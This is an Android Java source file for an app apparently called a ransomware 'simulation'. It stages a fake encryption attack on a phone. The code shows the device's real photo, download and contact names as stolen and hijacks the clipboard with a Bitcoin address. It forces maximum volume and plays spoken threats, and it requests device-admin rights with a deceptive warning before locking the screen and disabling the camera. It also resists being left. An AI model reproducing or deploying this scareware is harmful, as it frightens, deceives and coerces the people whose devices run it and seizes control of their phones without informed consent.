package com.china.fakeransom;

import android.Manifest;
import android.app.ActivityManager;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.hardware.Camera;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.view.MotionEvent;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class FakeRansomActivity extends AppCompatActivity implements SurfaceHolder.Callback {

    private static final long COUNTDOWN_TOTAL_SECONDS = 48L * 3600;
    private static final long FAKE_REBOOT_DELAY_MS = 120_000;
    private static final long FAKE_REBOOT_DURATION_MS = 15_000;
    private static final long FAKE_CALL_DELAY_MS = 45_000;
    private static final long AUTO_EXIT_DELAY_MS = 600_000;
    private static final long KILL_GESTURE_WINDOW_MS = 4000;
    private static final int KILL_GESTURE_TAPS = 7;
    private static final long INTERLUDE_MS = 12_000;
    private static final int ADMIN_REQUEST = 42;

    private TextView statusText;
    private TextView skullGlyph;
    private TextView terminalText;
    private TextView countdownText;
    private TextView ransomNote;
    private TextView victimInfo;
    private TextView cameraBadge;
    private TextView rebootText;
    private TextView interludeText;
    private View terminalScroll;
    private View borderFlash;
    private View rebootOverlay;
    private View interludeOverlay;
    private ProgressBar progressBar;
    private SurfaceView cameraPreview;

    private final SirenPlayer siren = SirenPlayer.get();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private Vibrator vibrator;
    private AudioManager audio;
    private TextToSpeech tts;
    private Camera camera;

    private boolean simulationActive = false;
    private boolean dndRequested = false;
    private boolean overlayRequested = false;
    private long secondsRemaining = COUNTDOWN_TOTAL_SECONDS;
    private long killGestureStart = 0;
    private int killTaps = 0;
    private int restoreAttempts = 0;
    private int rebootDots = 0;
    private int rampLevel = 0;
    private int borderDelayMs = 260;
    private boolean borderRed = false;
    private int ttsLineIndex = 0;
    private String victimId = "";
    private String sessionKey = "";

    private final String[] ttsLines = {
            "All of your files have been encrypted.",
            "Your camera and microphone are active.",
            "Do not attempt to shut down. Attempt detected.",
            "Your contacts are on our servers.",
            "Payments restore access within five minutes.",
            "Every keystroke is being recorded."
    };

    private final Runnable borderPulse = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            GradientDrawable d = new GradientDrawable();
            d.setColor(Color.TRANSPARENT);
            d.setStroke(10, borderRed ? 0xFFFF0000 : 0xFF0033FF);
            borderFlash.setBackground(d);
            borderRed = !borderRed;
            mainHandler.postDelayed(this, borderDelayMs);
        }
    };

    private final Runnable volumeEnforcer = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            forceVolume();
            mainHandler.postDelayed(this, 3000);
        }
    };

    private final Runnable clipboardPoisoner = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null) {
                    cm.setPrimaryClip(ClipData.newPlainText("notes",
                            "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVDemonstration"));
                }
            } catch (Throwable ignored) {
            }
            mainHandler.postDelayed(this, 5000);
        }
    };

    private final Runnable ttsLoop = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive || tts == null) return;
            try {
                tts.speak(ttsLines[ttsLineIndex % ttsLines.length],
                        TextToSpeech.QUEUE_ADD, null, "threat" + ttsLineIndex);
                ttsLineIndex++;
            } catch (Throwable ignored) {
            }
            mainHandler.postDelayed(this, 25_000);
        }
    };

    private final Runnable escalationRamp = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            rampLevel++;
            if (rampLevel <= 9) {
                siren.applyRamp(1.0f + 0.038f * rampLevel);
                borderDelayMs = Math.max(120, 260 - 15 * rampLevel);
                startVibration();
            }
            mainHandler.postDelayed(this, 20_000);
        }
    };

    private final Runnable rebootAnimator = new Runnable() {
        @Override
        public void run() {
            if (!simulationActive) return;
            rebootDots = (rebootDots + 1) % 5;
            StringBuilder dotsBuilder = new StringBuilder();
            for (int i = 0; i < rebootDots; i++) {
                dotsBuilder.append(' ');
            }
            String dots = dotsBuilder.toString();
            rebootText.setText("REINSTALLING SYSTEM IMAGE — DO NOT POWER OFF\n"
                    + "  wiping /data/data ... ok\n"
                    + "  wiping /sdcard ... ok\n"
                    + "  rebuilding partition table ... ok\n"
                    + "  verifying bootloader .......... ok" + dots);
            mainHandler.postDelayed(this, 600);
        }
    };

    private final Runnable killHold = new Runnable() {
        @Override
        public void run() {
            endSimulation("SIMULATION TERMINATED");
        }
    };

    private final BroadcastReceiver endReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            endSimulation("SIMULATION TERMINATED");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SECURE
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        WindowManager.LayoutParams lp = getWindow().getAttributes();
        lp.screenBrightness = 1.0f;
        getWindow().setAttributes(lp);

        setContentView(R.layout.activity_fake_ransom);

        audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);

        skullGlyph = findViewById(R.id.skullGlyph);
        statusText = findViewById(R.id.statusText);
        terminalScroll = findViewById(R.id.terminalScroll);
        terminalText = findViewById(R.id.terminalText);
        countdownText = findViewById(R.id.countdownText);
        ransomNote = findViewById(R.id.ransomNote);
        victimInfo = findViewById(R.id.victimInfo);
        cameraBadge = findViewById(R.id.cameraBadge);
        rebootOverlay = findViewById(R.id.rebootOverlay);
        rebootText = findViewById(R.id.rebootText);
        borderFlash = findViewById(R.id.borderFlash);
        interludeOverlay = findViewById(R.id.interludeOverlay);
        interludeText = findViewById(R.id.interludeText);
        progressBar = findViewById(R.id.progressBar);
        cameraPreview = findViewById(R.id.cameraPreview);

        skullGlyph.setOnClickListener(v -> onKillGestureTap());
        ransomNote.setOnClickListener(v -> requestAdmin());
        findViewById(R.id.paymentBtn).setOnClickListener(v -> {
            if (simulationActive) {
                startActivity(new Intent(this, PaymentActivity.class));
            }
        });

        statusText.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                mainHandler.postDelayed(killHold, 6000);
                return true;
            } else if (event.getAction() == MotionEvent.ACTION_UP
                    || event.getAction() == MotionEvent.ACTION_CANCEL) {
                mainHandler.removeCallbacks(killHold);
                return false;
            }
            return false;
        });

        SurfaceHolder holder = cameraPreview.getHolder();
        holder.addCallback(this);

        ContextCompat.registerReceiver(this, endReceiver,
                new IntentFilter("com.china.fakeransom.END_SIM"),
                ContextCompat.RECEIVER_NOT_EXPORTED);

        SimUtil.setSimActive(true);
        WallpaperUtil.capture(this);

        requestPermissions();
        forceVolume();
        mainHandler.postDelayed(volumeEnforcer, 3000);
        siren.start();
        startVibration();
        enterFullscreen();
        startSimulation();
        mainHandler.postDelayed(this::runFakeReboot, FAKE_REBOOT_DELAY_MS + 30_000);
        mainHandler.postDelayed(() -> {
            if (simulationActive) {
                endSimulation("SIMULATION EXPIRED — AUTO-RELEASED");
            }
        }, AUTO_EXIT_DELAY_MS);
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if (intent != null && intent.getBooleanExtra("KILL", false)) {
            endSimulation("SIMULATION TERMINATED");
        }
    }

    private void requestPermissions() {
        List<String> wanted = new ArrayList<>();
        wanted.add(Manifest.permission.CAMERA);
        wanted.add(Manifest.permission.READ_CONTACTS);
        wanted.add(Manifest.permission.REORDER_TASKS);
        if (Build.VERSION.SDK_INT >= 33) {
            wanted.add(Manifest.permission.READ_MEDIA_IMAGES);
            wanted.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            wanted.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        List<String> missing = new ArrayList<>();
        for (String p : wanted) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), 1337);
        }
    }

    private void forceVolume() {
        if (audio == null) return;
        try {
            audio.setStreamVolume(AudioManager.STREAM_ALARM,
                    audio.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
        } catch (Throwable ignored) {
        }
        try {
            audio.setStreamVolume(AudioManager.STREAM_MUSIC,
                    audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
        } catch (Throwable ignored) {
        }
    }

    private void startVibration() {
        if (vibrator == null) return;
        long gap = Math.max(300, 1500 - 120L * rampLevel);
        long[] pattern = {0, 500, 250, 500, gap};
        vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
    }

    private void enterFullscreen() {
        View decor = getWindow().getDecorView();
        decor.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            enterFullscreen();
        }
    }

    private void startSimulation() {
        simulationActive = true;
        victimId = DeviceId.secureId(this);
        sessionKey = UUID.randomUUID().toString().toUpperCase();

        List<String> collected = new ArrayList<>();
        collected.addAll(photoNames());
        collected.addAll(downloadFileNames());
        collected.addAll(contactNames());
        if (collected.isEmpty()) {
            collected = fakeFileNames();
        }
        terminalSchedule(buildTerminalLines(collected));
    }

    private List<String> photoNames() {
        List<String> names = new ArrayList<>();
        try {
            Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{MediaStore.Images.Media.DISPLAY_NAME}, null, null, null);
            if (c != null) {
                while (c.moveToNext() && names.size() < 8) {
                    names.add(c.getString(0));
                }
                c.close();
            }
        } catch (Exception ignored) {
        }
        return names;
    }

    private List<String> downloadFileNames() {
        List<String> names = new ArrayList<>();
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File[] files = dir.listFiles();
            if (files != null) {
                int count = 0;
                for (File f : files) {
                    if (count >= 6) break;
                    names.add(f.getName());
                    count++;
                }
            }
        } catch (Exception ignored) {
        }
        return names;
    }

    private List<String> contactNames() {
        List<String> names = new ArrayList<>();
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {
                Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                        new String[]{ContactsContract.Contacts.DISPLAY_NAME}, null, null, null);
                if (c != null) {
                    while (c.moveToNext() && names.size() < 5) {
                        names.add(c.getString(0));
                    }
                    c.close();
                }
            }
        } catch (Exception ignored) {
        }
        return names;
    }

    private List<String> fakeFileNames() {
        List<String> names = new ArrayList<>();
        names.add("photos.zip");
        names.add("banking_app.db");
        names.add("credentials.txt");
        names.add("whatsapp_media.mp4");
        names.add("documents_backup.tar.gz");
        names.add("contacts.vcf");
        return names;
    }

    private List<String> buildTerminalLines(List<String> collected) {
        List<String> lines = new ArrayList<>();
        lines.add("[*] payload v2.7 staging...");
        lines.add("[*] battery: DEVICE PLUGGED ? KEEP CHARGING");
        lines.add("[*] mounting /data and /sdcard read-write");
        lines.add("[!] keylogger ARMED");
        lines.add("[!] clipboard monitor ARMED");
        lines.add("[*] indexing gallery");
        for (String name : collected) {
            if (name.contains("@")) {
                lines.add("[+] harvested contact: " + name);
            } else {
                lines.add("[*] " + name + " -> " + name + ".locked (AES-256-CBC + RSA-4096)");
            }
        }
        lines.add("[*] indexing instant messages");
        lines.add("[*] indexing email cache");
        lines.add("[*] indexing stored passwords");
        lines.add("[!] camera feed stored: camera_front.yuv");
        lines.add("[!] microphone stream buffered: audio_last_31h.wav");
        lines.add("[*] uploading 1,384 items to vault (tor relay chain)");
        lines.add("[*] upload complete: 100% — originals DESTROYED");
        lines.add("[*] wiping volume shadow copies ... ok");
        lines.add("[*] victim id: " + victimId);
        lines.add("[*] session key: " + sessionKey);
        lines.add("[!] ENCRYPTION COMPLETE — " + collected.size() + " items. key escrowed.");
        lines.add("[!] forwarding device report to authorities");
        return lines;
    }

    private void terminalSchedule(List<String> lines) {
        statusText.setText("ENCRYPTING SYSTEM...");
        ransomNote.setVisibility(View.GONE);
        terminalScroll.setVisibility(View.VISIBLE);
        terminalText.setText("");

        for (int i = 0; i < lines.size(); i++) {
            final String line = lines.get(i);
            final int step = i + 1;
            final boolean last = (i == lines.size() - 1);
            mainHandler.postDelayed(() -> {
                if (!simulationActive) return;
                terminalText.append(line + "\n");
                progressBar.setProgress((int) (step * 100 / (float) lines.size()));
                if (last) {
                    mainHandler.postDelayed(this::showCompromisedScreen, 900);
                }
            }, 400 + (i * 550L));
        }
    }

    private void showCompromisedScreen() {
        if (!simulationActive) return;
        terminalScroll.setVisibility(View.GONE);
        progressBar.setVisibility(View.GONE);
        interludeOverlay.setVisibility(View.VISIBLE);
        interludeText.setText("⚠ COMPUTER SECURITY RESPONSE ⚠\n\n"
                + "This device was COMPROMISED.\n\n"
                + "An unauthorized intrusion encrypted all local storage and\n"
                + "staged your personal data for exfiltration.\n\n"
                + "Case #0472-B — incident recorded for evidence.\n"
                + "Device session is under external control.\n\n"
                + "Do not power off. A recovery channel is opening...");
        statusText.setText("SECURITY RESPONSE ACTIVE");
        mainHandler.postDelayed(this::showCompromisedScreenDone, INTERLUDE_MS);
    }

    private void showCompromisedScreenDone() {
        if (!simulationActive) return;
        interludeOverlay.setVisibility(View.GONE);
        showRansom();
    }

    private void showRansom() {
        if (!simulationActive) return;

        statusText.setText("YOUR DEVICE IS LOCKED");
        terminalScroll.setVisibility(View.GONE);
        progressBar.setVisibility(View.GONE);
        interludeOverlay.setVisibility(View.GONE);
        ransomNote.setVisibility(View.VISIBLE);

        ransomNote.setText("ALL YOUR FILES HAVE BEEN ENCRYPTED\n\n"
                + "Photos, videos, documents, chats and passwords are safely on our servers\n"
                + "and locked on this device with AES-256 + RSA-4096.\n"
                + "Recovery without our private key is mathematically impossible.\n\n"
                + "PAY 0.05 BTC TO:\n"
                + "  1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVDemonstration\n\n"
                + "Send your VICTIM ID to: support@restoration-portal.demo\n"
                + "Verified payments unlock within 5 minutes.\n\n"
                + "We have your FACE from the front camera.\n"
                + "We have your CONTACTS, your PASSWORDS and your LOCATION HISTORY.\n"
                + "Cooperate and this stays private.\n\n"
                + "DO NOT turn off the device.\n"
                + "DO NOT connect to a computer.\n"
                + "Tampering destroys the decryption guarantee.\n\n"
                + "TAP THIS NOTE FOR \"RESTORE ACCESS\" (ADMINISTRATION REQUIRED).\n"
                + "or use OPEN PAYMENT PORTAL below.");

        victimInfo.setText("VICTIM ID: " + victimId + "\nSESSION KEY: " + sessionKey);
        startCountdown();

        WallpaperUtil.setRansom(this);
        initTts();
        mainHandler.postDelayed(clipboardPoisoner, 5000);
        mainHandler.postDelayed(escalationRamp, 20_000);
        mainHandler.postDelayed(borderPulse, 300);
        mainHandler.postDelayed(this::checkOverlay, 4000);
        mainHandler.postDelayed(this::requestAdmin, 8000);
        mainHandler.postDelayed(this::checkDnd, 14_000);
        mainHandler.postDelayed(() -> {
            if (simulationActive) {
                startActivity(new Intent(this, FakeCallActivity.class));
            }
        }, FAKE_CALL_DELAY_MS);
    }

    private void initTts() {
        try {
            tts = new TextToSpeech(this, status -> {
                if (status == TextToSpeech.SUCCESS) {
                    try {
                        tts.setLanguage(Locale.US);
                        tts.setPitch(0.55f);
                        tts.setSpeechRate(0.85f);
                        mainHandler.post(ttsLoop);
                    } catch (Throwable ignored) {
                    }
                }
            });
        } catch (Throwable ignored) {
            tts = null;
        }
    }

    private void checkOverlay() {
        if (!simulationActive) return;
        if (Settings.canDrawOverlays(this)) {
            startService(new Intent(this, OverlayService.class));
        } else if (!overlayRequested) {
            overlayRequested = true;
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        android.net.Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Throwable ignored) {
            }
        }
    }

    private void checkDnd() {
        if (!simulationActive || dndRequested) return;
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm == null) return;
        if (nm.isNotificationPolicyAccessGranted()) {
            SimUtil.applyDndAlarmsOnly(this);
        } else {
            dndRequested = true;
            try {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS));
            } catch (Throwable ignored) {
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!simulationActive) return;
        if (Settings.canDrawOverlays(this)) {
            try {
                startService(new Intent(this, OverlayService.class));
            } catch (Throwable ignored) {
            }
        }
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm != null && nm.isNotificationPolicyAccessGranted()) {
            SimUtil.applyDndAlarmsOnly(this);
        }
    }

    private void startCountdown() {
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!simulationActive) return;
                secondsRemaining = Math.max(0, secondsRemaining - 1);
                long h = secondsRemaining / 3600;
                long m = (secondsRemaining % 3600) / 60;
                long s = secondsRemaining % 60;
                countdownText.setText(String.format(Locale.US,
                        "FILES DELETED IN %02d:%02d:%02d", h, m, s));
                int color = rampLevel <= 2 ? 0xFFFFCC00 : (rampLevel <= 5 ? 0xFFFF8800 : 0xFFFF2222);
                countdownText.setTextColor(color);
                mainHandler.postDelayed(this, 1000);
            }
        }, 800);
    }

    private void requestAdmin() {
        if (!simulationActive) return;
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            enableAdminFeatures();
            dpm.lockNow();
            return;
        }
        try {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Device administration is required to complete identity verification "
                            + "and restore access. Refusing may lock the terminal permanently.");
            startActivityForResult(i, ADMIN_REQUEST);
        } catch (Exception ignored) {
        }
    }

    private void enableAdminFeatures() {
        SimUtil.setCameraDisabled(this, true);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != ADMIN_REQUEST) return;
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            enableAdminFeatures();
            dpm.lockNow();
        } else {
            Toast.makeText(this, "ACCESS DENIED BY ADMINISTRATOR", Toast.LENGTH_LONG).show();
        }
    }

    private void runFakeReboot() {
        if (!simulationActive) return;
        siren.pause();
        if (vibrator != null) vibrator.cancel();
        rebootText.setText("REINSTALLING SYSTEM IMAGE — DO NOT POWER OFF");
        rebootText.setKeepScreenOn(true);
        rebootOverlay.setVisibility(View.VISIBLE);
        mainHandler.postDelayed(rebootAnimator, 600);
        mainHandler.postDelayed(() -> {
            rebootOverlay.setVisibility(View.GONE);
            restoreAttempts++;
            statusText.setText("RESTORE FAILED — ATTEMPT " + restoreAttempts + "/3");
            forceVolume();
            siren.resumePlaying();
            startVibration();
            if (restoreAttempts < 3) {
                mainHandler.postDelayed(this::runFakeReboot, 120_000);
            }
        }, FAKE_REBOOT_DURATION_MS);
    }

    private void onKillGestureTap() {
        long now = System.currentTimeMillis();
        if (now - killGestureStart > KILL_GESTURE_WINDOW_MS) {
            killTaps = 0;
        }
        if (killTaps == 0) {
            killGestureStart = now;
        }
        killTaps++;
        if (killTaps >= KILL_GESTURE_TAPS) {
            endSimulation("SIMULATION TERMINATED");
        }
    }

    private void endSimulation(String reason) {
        if (!simulationActive && isFinishing()) return;
        simulationActive = false;
        SimUtil.setSimActive(false);
        mainHandler.removeCallbacksAndMessages(null);
        siren.stop();
        stopTts();
        SimUtil.fullCleanup(this);
        try {
            stopService(new Intent(this, OverlayService.class));
        } catch (Throwable ignored) {
        }
        Toast.makeText(this, reason + " — CAMERA RESTORED, WALLPAPER RESTORED, SETTINGS RESTORED", Toast.LENGTH_LONG).show();
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                Intent i = new Intent();
                i.setComponent(new ComponentName("com.android.settings",
                        "com.android.settings.DeviceAdminAdd"));
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            }
        } catch (Throwable ignored) {
        }
        finish();
    }

    private void stopTts() {
        if (tts != null) {
            try {
                tts.stop();
                tts.shutdown();
            } catch (Throwable ignored) {
            }
            tts = null;
        }
    }

    private void returnToFront() {
        if (!simulationActive || isFinishing()) return;
        try {
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            am.moveTaskToFront(getTaskId(), ActivityManager.MOVE_TASK_WITH_HOME);
        } catch (Throwable ignored) {
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (simulationActive) {
            mainHandler.postDelayed(this::returnToFront, 700);
        }
    }

    @Override
    public void onBackPressed() {
        Toast.makeText(this, "DEVICE LOCKED — SIMULATION IN PROGRESS", Toast.LENGTH_SHORT).show();
    }

    private void releaseCamera() {
        if (camera != null) {
            try {
                camera.stopPreview();
                camera.release();
            } catch (Throwable ignored) {
            }
            camera = null;
        }
    }

    @Override
    public void surfaceCreated(@NonNull SurfaceHolder holder) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        try {
            Camera.CameraInfo info = new Camera.CameraInfo();
            int frontId = -1;
            for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    frontId = i;
                    break;
                }
            }
            camera = Camera.open(frontId >= 0 ? frontId : 0);
            camera.setDisplayOrientation(180);
            camera.setPreviewDisplay(holder);
            camera.startPreview();
            cameraBadge.setVisibility(View.VISIBLE);
        } catch (Throwable t) {
            releaseCamera();
        }
    }

    @Override
    public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
    }

    @Override
    public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
        releaseCamera();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        simulationActive = false;
        SimUtil.setSimActive(false);
        mainHandler.removeCallbacksAndMessages(null);
        siren.stop();
        stopTts();
        SimUtil.fullCleanup(this);
        releaseCamera();
        try {
            unregisterReceiver(endReceiver);
        } catch (Throwable ignored) {
        }
    }
}
